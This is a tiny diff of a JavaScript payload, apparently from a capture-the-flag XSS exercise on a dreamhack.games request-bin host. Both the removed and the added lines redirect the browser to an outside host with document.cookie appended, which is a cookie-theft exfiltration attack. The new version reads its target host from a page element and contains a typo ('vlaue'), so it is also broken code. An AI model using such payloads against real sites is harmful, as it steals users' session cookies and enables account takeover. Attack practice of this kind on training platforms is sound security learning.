@@ -1,1 +1,2 @@
-document.location.href="https://vqpfkuq.request.dreamhack.games/?cook="+document.cookie;
+var url = document.getElementById("JCHAN").vlaue;
+document.location.href="https://"+url+"?Message="+document.cookie;
